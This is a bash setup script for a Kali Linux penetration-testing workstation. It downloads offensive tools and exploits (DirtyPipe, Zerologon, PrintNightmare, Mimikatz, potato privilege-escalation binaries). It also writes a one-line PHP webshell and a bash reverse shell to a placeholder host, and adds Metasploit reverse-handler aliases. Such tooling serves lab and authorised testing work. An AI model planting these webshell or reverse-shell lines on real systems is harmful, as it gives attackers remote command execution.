#!/usr/bin/env bash

# Initialize arrays to track status
declare -a failed_packages=()
declare -a successful_packages=()
declare -a failed_downloads=()
declare -a failed_git_clones=()

# Set HOME_DIR and TOOLS_DIR
HOME_DIR="/home/kali"
TOOLS_DIR="$HOME_DIR/Tools"

SUMMARY_SHOWN="false"

# Function to install a package and track its status with timeout
install_package() {
    local package=$1
    local timeout_duration=600  # 10 minutes in seconds
    echo "Installing $package..."
    
    # Create a temporary file to capture the installation status
    local tmp_status=$(mktemp)
    
    # Run the installation with timeout
    timeout $timeout_duration bash -c "DEBIAN_FRONTEND=noninteractive apt-get -o DPkg::options::=--force-confdef -o DPkg::options::=--force-confold install $package -y" >/dev/null 2>&1 && echo "success" > "$tmp_status" || echo "failed" > "$tmp_status" &
    
    local pid=$!
    
    # Show a simple progress indicator while waiting
    local chars="/-\|"
    local count=0
    while kill -0 $pid 2>/dev/null; do
        local char="${chars:$count:1}"
        echo -en "\rInstalling $package... $char"
        sleep 0.2
        count=$(( (count + 1) % 4 ))
    done
    
    # Check the installation status
    if [ "$(cat $tmp_status)" == "success" ]; then
        successful_packages+=("$package")
        echo -e "\r✓ Successfully installed $package"
        rm "$tmp_status"
        return 0
    else
        failed_packages+=("$package (timeout/error)")
        echo -e "\r✗ Failed to install $package - timed out after ${timeout_duration}s"
        rm "$tmp_status"
        # Cleanup any hanging apt processes
        pkill -f "apt-get.*$package" 2>/dev/null || true
        # Reset the package manager state
        killall apt apt-get 2>/dev/null || true
        rm -f /var/lib/apt/lists/lock
        rm -f /var/cache/apt/archives/lock
        rm -f /var/lib/dpkg/lock*
        dpkg --configure -a 2>/dev/null || true
        return 0  # Return 0 to continue script execution
    fi
}

# Add better directory checking throughout the script
check_directory() {
    local dir=$1
    local name=$2
    if [ ! -d "$dir" ]; then
        echo "✗ Failed to find $name directory"
        failed_downloads+=("$name - directory not found")
        return 1
    fi
    return 0
}

# Function to handle downloads and track failures
download_tool() {
    local url=$1
    local destination=$2
    local name=$3
    
    echo "Downloading $name..."
    if wget -q "$url" -O "$destination"; then
        echo "✓ Successfully downloaded $name"
        return 0
    else
        failed_downloads+=("$name")
        echo "✗ Failed to download $name"
        return 1
    fi
}

# Function to handle git clones
git_clone_tool() {
    local url=$1
    local name=$2
    
    echo "Cloning $name..."
    if git clone --quiet "$url"; then
        echo "✓ Successfully cloned $name"
        return 0
    else
        failed_git_clones+=("$name")
        echo "✗ Failed to clone $name"
        return 1
    fi
}

# Function to display summary
display_summary() {
    # Only display if it hasn't been shown yet
    if [ "$SUMMARY_SHOWN" != "true" ]; then
        echo -e "\n=== Installation Summary ==="
        echo "Successfully installed packages (${#successful_packages[@]}):"
        if [ ${#successful_packages[@]} -eq 0 ]; then
            echo "None"
        else
            printf '%s\n' "${successful_packages[@]}" | sort
        fi
        
        echo -e "\nFailed packages (${#failed_packages[@]}):"
        if [ ${#failed_packages[@]} -eq 0 ]; then
            echo "None"
        else
            printf '%s\n' "${failed_packages[@]}" | sort
        fi
        
        echo -e "\nFailed downloads (${#failed_downloads[@]}):"
        if [ ${#failed_downloads[@]} -eq 0 ]; then
            echo "None"
        else
            printf '%s\n' "${failed_downloads[@]}" | sort
        fi
        
        echo -e "\nFailed git clones (${#failed_git_clones[@]}):"
        if [ ${#failed_git_clones[@]} -eq 0 ]; then
            echo "None"
        else
            printf '%s\n' "${failed_git_clones[@]}" | sort
        fi
        
        SUMMARY_SHOWN="true"
    fi
}

# Function to setup and use Python virtual environment
setup_venv() {
    local venv_path="$TOOLS_DIR/.venv"
    echo "Setting up Python virtual environment at $venv_path"
    
    # Install required package for virtual environments
    apt-get install python3-venv -y >/dev/null 2>&1
    
    # Create virtual environment if it doesn't exist
    if [ ! -d "$venv_path" ]; then
        python3 -m venv "$venv_path"
    fi
    
    # Activate virtual environment
    source "$venv_path/bin/activate"
}

# Add cleanup for virtual environment
cleanup() {
    if [ -d "$TOOLS_DIR/.venv" ]; then
        rm -rf "$TOOLS_DIR/.venv"
    fi
    # Call display_summary in cleanup
    display_summary
}

trap cleanup EXIT

# Trap to ensure summary is displayed even if script exits early
trap display_summary EXIT

# Main script execution
echo "Starting installation process..."

# Create directory structure
echo "Creating directory structure..."
mkdir -p "$TOOLS_DIR"/{web,linux,windows/{AD,mimi}} "$HOME_DIR"/{misc,home}

# Remove default directories safely
rm -rf "$HOME_DIR"/{Documents,Videos,Pictures,Music,Templates,Public} 2>/dev/null || true

# Update package lists without failing on error
echo "Updating package lists..."
apt-get update -y || true
apt-get dist-upgrade -y || true

# Package list
PACKAGES=(
    "gedit" "rlwrap" "fcrackzip" "gobuster" "evil-winrm" "wpscan" "nikto"
    "dirsearch" "python3-pip" "amap" "nishang" "docker.io" "neo4j" "bloodhound"
    "libreoffice-common" "libreoffice-writer" "feroxbuster" "assetfinder" "jq"
    "subfinder" "sublist3r" "arjun" "jsbeautifier" "chromium" "pup" "golang"
    "kali-wallpapers-all" "curl" "wget" "git" "p7zip-full" "unzip" "xdotool"
)

# Install packages
total_packages=${#PACKAGES[@]}
current_package=0

for package in "${PACKAGES[@]}"; do
    ((current_package++))
    echo -e "\nPackage $current_package of $total_packages"
    install_package "$package"
    sleep 2
done

# Configure Go environment
echo "Configuring Go environment..."
{
    echo "export GOROOT=/usr/lib/go"
    echo "export GOPATH=\$HOME/go"
    echo "export PATH=\$GOPATH/bin:\$GOROOT/bin:\$PATH"
} | tee -a "$HOME_DIR"/.{bashrc,zshrc}

# Function to install Python packages safely
install_python_package() {
    local package=$1
    echo "Installing Python package: $package"
    setup_venv
    pip install "$package" || true
    deactivate
}

# Install Linux Tools
echo "Installing Linux Tools..."
cd "$TOOLS_DIR/linux" || exit 1

# Ligolo-ng installation
install_ligolo() {
    local version="v0.4.4"
    download_tool "https://github.com/nicocha30/ligolo-ng/releases/download/$version/ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz" "ligolo-proxy.tar.gz" "Ligolo Linux Proxy" && {
        gunzip -f ligolo-proxy.tar.gz
        tar -xf ligolo-proxy.tar
        rm -f ligolo-proxy.tar LICENSE README.md
        mv proxy LinuxProxy
    }
    
    download_tool "https://github.com/nicocha30/ligolo-ng/releases/download/$version/ligolo-ng_agent_0.4.4_windows_amd64.zip" "agent-windows.zip" "Ligolo Windows Agent" && {
        unzip -q agent-windows.zip
        rm -f LICENSE README.md agent-windows.zip
        mv agent.exe WindowsAgent.exe
    }
    
    download_tool "https://github.com/nicocha30/ligolo-ng/releases/download/$version/ligolo-ng_agent_0.4.4_linux_amd64.tar.gz" "ligolo-agent.tar.gz" "Ligolo Linux Agent" && {
        gunzip -f ligolo-agent.tar.gz
        tar -xf ligolo-agent.tar
        rm -f ligolo-agent.tar LICENSE README.md
        mv agent LinuxAgent
    }
}

install_ligolo

# Download Linux enumeration and exploitation tools
download_tool "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh" "linux-exploit-suggester.sh" "Linux Exploit Suggester"
download_tool "https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py" "suid3num.py" "SUID3NUM"
download_tool "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh" "LinEnum.sh" "LinEnum"
download_tool "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" "linpeas.sh" "LinPEAS"
download_tool "https://raw.githubusercontent.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/main/exploit.c" "dirtypipe.c" "DirtyPipe Exploit"
download_tool "https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c" "dirtycow.c" "DirtyCow Exploit"
download_tool "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" "LinuxSmartEnum.sh" "Linux Smart Enum"
download_tool "https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64" "pspy64" "pspy64"
download_tool "https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz" "chisel_linuxv177.gz" "Chisel Linux" && {
    gunzip -f chisel_linuxv177.gz
    chmod +x chisel_linuxv177
}

# Install AWS CLI
cd /opt/ || exit 1
download_tool "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" "awscliv2.zip" "AWS CLI" && {
    unzip -q awscliv2.zip
    ./aws/install
}

# Install Windows/AD Tools
echo "Installing Windows/AD Tools..."
cd "$TOOLS_DIR/windows/AD" || exit 1

# Download Windows AD tools
download_tool "https://github.com/h1dz/Windows-Tools2/raw/master/Certify.exe" "Certify.exe" "Certify"
git_clone_tool "https://github.com/Ridter/noPac" "noPac"
git_clone_tool "https://github.com/harshil-shah004/zerologon-CVE-2020-1472.git" "Zerologon"
download_tool "https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS.ps1" "adPEAS.ps1" "adPEAS"
download_tool "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64" "kerbrute" "Kerbrute"
chmod +x kerbrute

# Download BloodHound collectors
download_tool "https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.ps1" "SharpHound.ps1" "SharpHound PS1"
download_tool "https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe" "SharpHound.exe" "SharpHound EXE"
download_tool "https://github.com/byronkg/SharpGPOAbuse/raw/main/SharpGPOAbuse-master/SharpGPOAbuse.exe" "SharpGPOAbuse.exe" "SharpGPOAbuse"
download_tool "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" "PowerView.ps1" "PowerView"

# Download and extract JuicyPotatoNG
download_tool "https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.1/JuicyPotatoNG.zip" "JuicyPotatoNG.zip" "JuicyPotatoNG" && {
    unzip -q JuicyPotatoNG.zip
    rm -f JuicyPotatoNG.zip
}

# Install BloodHound.py
git_clone_tool "https://github.com/fox-it/BloodHound.py.git" "BloodHound.py"
cd BloodHound.py/ || exit 1
pip install . || true
cd ..

# Install Web Tools
echo "Installing Web Tools..."
cd "$TOOLS_DIR/web" || exit 1

# Clone and build Nuclei
git_clone_tool "https://github.com/projectdiscovery/nuclei.git" "Nuclei"
cd nuclei/ || exit 1
make build || true
cd ..

# Clone and setup other web tools
git_clone_tool "https://github.com/devanshbatham/openredirex" "OpenRedirex" && {
    cd openredirex || exit 1
    chmod +x setup.sh
    ./setup.sh || true
    cd ..
}

git_clone_tool "https://github.com/0xKayala/ParamSpider" "ParamSpider" && {
    cd ParamSpider || exit 1
    pip3 install -r requirements.txt || true
    cd ..
}

# Download and extract httpx
download_tool "https://github.com/projectdiscovery/httpx/releases/download/v1.3.5/httpx_1.3.5_linux_amd64.zip" "httpx.zip" "httpx" && {
    unzip -q httpx.zip
    rm -f README.md LICENSE.md httpx.zip
}

# Download and extract aquatone
download_tool "https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip" "aquatone.zip" "Aquatone" && {
    unzip -q aquatone.zip
    rm -f aquatone.zip LICENSE.txt README.md
}

# Clone additional web tools
git_clone_tool "https://github.com/stamparm/DSSS.git" "DSSS"
git_clone_tool "https://github.com/Tuhinshubhra/CMSeeK" "CMSeeK"
git_clone_tool "https://github.com/s0md3v/XSStrike" "XSStrike"
git_clone_tool "https://github.com/dievus/msdorkdump.git" "msdorkdump"
git_clone_tool "https://github.com/s0md3v/Corsy" "Corsy" && {
    cd Corsy/ || exit 1
    pip3 install requests || true
    cd ..
}

# Install additional web tools
cd "$TOOLS_DIR/web" || exit 1

git_clone_tool "https://github.com/ifconfig-me/subowner" "subowner"

git_clone_tool "https://github.com/GerbenJavado/LinkFinder.git" "LinkFinder" && {
    if check_directory "LinkFinder" "LinkFinder"; then
        cd LinkFinder || exit 1
        setup_venv
        pip install jsbeautifier || true
        python setup.py install || true
        deactivate
        cd ..
    fi
}

echo "Installing uro..."
setup_venv
pip install uro -v || true
deactivate

echo "Installing urless..."
setup_venv
pip install git+https://github.com/xnl-h4ck3r/urless.git -v || true
deactivate

echo "Installing xnLinkFinder..."
setup_venv
pip install git+https://github.com/xnl-h4ck3r/xnLinkFinder.git -v || true
deactivate

echo "Installing packages for the screenshot tool..."
cd /home/kali/Tools/web/
wget https://github.com/mozilla/geckodriver/releases/download/v0.33.0/geckodriver-v0.33.0-linux64.tar.gz
tar -xvf geckodriver-v0.33.0-linux64.tar.gz
rm -rf geckodriver-v0.33.0-linux64.tar.gz
chmod +x /home/kali/Tools/web/geckodriver
mv /home/kali/Tools/web/geckodriver /usr/local/bin/
setup_venv
pip install selenium -v || true
deactivate

git_clone_tool "https://github.com/m4ll0k/SecretFinder.git" "SecretFinder" && {
    if check_directory "SecretFinder" "SecretFinder"; then
        cd SecretFinder || exit 1
        setup_venv
        pip install -r requirements.txt || true
        mv SecretFinder.py USEmyGITsVersionOFthis-SecretFinder.py
        deactivate
        cd ..
    fi
}

git_clone_tool "https://github.com/1ndianl33t/Gf-Patterns" "Gf-Patterns"

git_clone_tool "https://github.com/Dionach/CMSmap" "CMSmap" && {
    if check_directory "CMSmap" "CMSmap"; then
        cd CMSmap || exit 1
        setup_venv
        pip install . || true
        deactivate
        cd ..
    fi
}

git_clone_tool "https://github.com/lc/gau.git" "gau" && {
    cd gau/cmd/gau || exit 1
    go build || true
    sudo mv gau /usr/local/bin/
    cd ../../..
}

git_clone_tool "https://github.com/projectdiscovery/katana" "katana" && {
    cd katana/cmd/katana || exit 1
    go build || true
    sudo cp katana /usr/local/bin/
    cd ../../..
}

# Install additional tools in home directory
cd "$HOME_DIR/home" || exit 1
go install github.com/tomnomnom/waybackurls@latest || true

# Create webshell and bash shell files
cat << 'EOF' > webshell.php
<?PHP system($_GET['cmd']); ?>
EOF

cat << 'EOF' > bashshell.sh
/bin/bash -c '/bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
EOF
chmod +x bashshell.sh

# Install Windows Tools
cd "$TOOLS_DIR/windows" || exit 1
download_tool "https://nmap.org/dist/nmap-7.92-win32.zip" "nmap-win32.zip" "Windows Nmap"

git_clone_tool "https://github.com/calebstewart/CVE-2021-1675" "PrintNightmare" && {
    cd CVE-2021-1675 || exit 1
    mv CVE-2021-1675.ps1 ../print-nightmare.ps1
    mv nightmare-dll ../
    cd ..
    rm -rf CVE-2021-1675/
}

# Copy and download Windows tools
cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 ./Invoke-PowerShellTcp.ps1

download_tool "https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_windows_amd64.gz" "chisel_windowsv177.gz" "Windows Chisel" && gunzip -f chisel_windowsv177.gz
download_tool "https://raw.githubusercontent.com/h1dz/Windows-Tools/master/powerup.ps1" "powerup.ps1" "PowerUp"
download_tool "https://github.com/carlospolop/PEASS-ng/releases/download/20220203/winPEASx64.exe" "winPEASx64.exe" "WinPEAS"
download_tool "https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe" "JuicyPotato.exe" "JuicyPotato"

download_tool "https://github.com/antonioCoco/RoguePotato/releases/download/1.0/RoguePotato.zip" "RoguePotato.zip" "RoguePotato" && {
    unzip -q RoguePotato.zip
    rm -f RoguePotato.zip RogueOxidResolver.exe
}

download_tool "https://github.com/int0x33/nc.exe/raw/master/nc64.exe" "nc64.exe" "Netcat 64"
download_tool "https://github.com/h1dz/Windows-Tools2/raw/master/Rubeus.exe" "Rubeus.exe" "Rubeus"
download_tool "https://github.com/h1dz/Windows-Tools2/raw/master/PsExec.exe" "psexec.exe" "PsExec"

# Set up Windows Nmap
mkdir -p nmap && cd nmap || exit 1
download_tool "https://nmap.org/dist/nmap-7.92-win32.zip" "nmap.zip" "Windows Nmap" && 7z e nmap.zip
cd ..

download_tool "https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe" "PrintSpoofer64.exe" "PrintSpoofer"
download_tool "https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1" "powercat.ps1" "PowerCat"

git_clone_tool "https://github.com/t3l3machus/hoaxshell" "hoaxshell" && {
    if check_directory "hoaxshell" "hoaxshell"; then
        cd hoaxshell || exit 1
        setup_venv
        pip install -r requirements.txt || true
        deactivate
        cd ..
    fi
}

# Install Mimikatz components
cd /home/kali/Tools/windows/mimi/ || exit 1
download_tool "https://gitlab.com/kalilinux/packages/mimikatz/-/raw/kali/master/x64/mimidrv.sys" "mimidrv.sys" "Mimikatz Driver"
download_tool "https://gitlab.com/kalilinux/packages/mimikatz/-/raw/kali/master/x64/mimikatz.exe" "mimi.exe" "Mimikatz"
download_tool "https://gitlab.com/kalilinux/packages/mimikatz/-/raw/kali/master/x64/mimilib.dll" "mimilib.dll" "Mimikatz Lib"
download_tool "https://gitlab.com/kalilinux/packages/mimikatz/-/raw/kali/master/x64/mimispool.dll" "mimispool.dll" "Mimikatz Spool"

cd "$HOME_DIR" || exit 1

# Set theme
echo "Setting system theme..."
sudo -u kali xfconf-query -c xsettings -p /Net/IconThemeName -s Flat-Remix-Blue-Dark
sudo -u kali xfconf-query -c xsettings -p /Net/ThemeName -s Kali-Dark
sudo -u kali xfconf-query -c xfwm4 -p /general/theme -s Kali-Dark
sudo -u kali gsettings set org.xfce.mousepad.preferences.view color-scheme Kali-Dark

# Configure and start services
echo "Configuring services..."
systemctl daemon-reload
systemctl restart startup.service
systemctl enable startup.service

echo "Editing FFUF config..."
cat << EOF > /home/kali/.config/ffuf/autocalibration/basic.json
{
  "basic_admin": [
    "admin123XYZ",
    "adminLoginTest",
    "adminNoAccessHere",
    "adminInvalid",
    "dashboardFake"
  ],
  "basic_random": [
    "randomPayload1234",
    "testString5678",
    "completelyRandom4567",
    "unpredictableTest9999",
    "noSenseData1111"
  ],
  "htaccess": [
    ".htaccessExample123",
    ".htpasswdFake567",
    ".htaccessHidden",
    ".configFake123",
    ".htaccessTest456"
  ],
  "common_test_files": [
    "robots.txtTest123",
    "testFileFake567",
    "sitemap.xmlHidden",
    "favicon.icoBroken",
    "README.mdTest"
  ],
  "random_dir": [
    "nonexistentFolder123/",
    "randomPathNoAccess/",
    "fakeDirTesting999/",
    "invalidLocation555/",
    "unrealFolderTest/"
  ]
}
EOF

cat << EOF > /home/kali/.config/ffuf/autocalibration/advanced.json
{
  "admin_dir": [
    "adminAreaFake/",
    "secretAdminZone/",
    "adminNotHere/",
    "controlPanelNope/",
    "adminTestInvalid/"
  ],
  "basic_admin": [
    "adminPath404",
    "adminTest123",
    "adminRandomData987",
    "adminDummyPage",
    "superAdminHidden"
  ],
  "basic_random": [
    "randomPayload999",
    "completelyRandomABC",
    "testCaseRandom123",
    "uniqueDataTest999",
    "stringTestFail567"
  ],
  "htaccess": [
    ".htaccessNotReal",
    ".hiddenFileTest",
    ".htpasswd404Error",
    ".configExample",
    ".fakeAccessFile"
  ],
  "random_dir": [
    "testFolder999/",
    "missingPath123/",
    "fakeDataDirectory/",
    "unrealDirTest456/",
    "nonExistentFolder/"
  ],
  "config_files": [
    ".envInvalid",
    "config.jsonFake",
    "settings.xml404",
    ".gitHiddenRepo",
    "database.configTest"
  ],
  "php_files": [
    "index.phpFake123",
    "testPage.php",
    "invalidData.php",
    "fakePHPfile.php",
    "hiddenScript.php"
  ],
  "backup_files": [
    "backup.zipTest",
    "testFile.bak",
    "site.bakInvalid",
    "hiddenBackup123",
    "backupFileFail"
  ]
}
EOF

# Configure aliases
cd $HOME_DIR
echo "Configuring aliases..."
{
    echo "alias msf1='sudo msfconsole -q -x \"use exploit/multi/handler; set payload linux/meterpreter/reverse_tcp; set lhost tun0; set lport 443; exploit\"'"
    echo "alias msf2='sudo msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 443; exploit\"'"
    echo "alias ipa='ip -br addr show'"
    echo "alias lll='ls -la --color=auto'"
    echo "alias s='searchsploit'"
    echo "alias ncl='sudo rlwrap -r -c -l RevShellLogs.txt nc -lvnkp 443'"
    echo "alias home='cd /home/kali/home'"
    echo "alias tools='cd /home/kali/Tools'"
    echo "alias pys='sudo python3 -m http.server 80'"
    echo "alias rmv='sudo rm -rf hash id_rsa exploit.py exploit.sh hash.txt user.txt pass.txt names.txt name.txt sharesSMB.txt smbResults ports3.txt ports2.txt ports1.txt ports0.txtnmap.txt masscan4.txt masscan3.txt masscan2.txt masscan1.txt Gobusterscan.txt GobusterExt_DUMP.txt Gobuster_DUMP.txt; rm *.log'"
    echo "alias wwe='script -f -c \"bash\" ./\$(date +%s%N | sha256sum | base64 | head -c 6).log'"
    echo "alias drs1='dirsearch -w /usr/share/wordlists/dirb/common.txt -f -r --random-agent --full-url -u \$1'"
    echo "alias drs2='dirsearch -w /usr/share/wordlists/dirb/big.txt -f -r --random-agent --full-url -u \$1'"
} | tee -a .bash_aliases .zshrc

# Source configuration files
echo "Sourcing configuration files..."
cd $HOME_DIR
source .bash_aliases
source .zshrc
source .bash_aliases
source .zshrc

echo "Installation complete!"
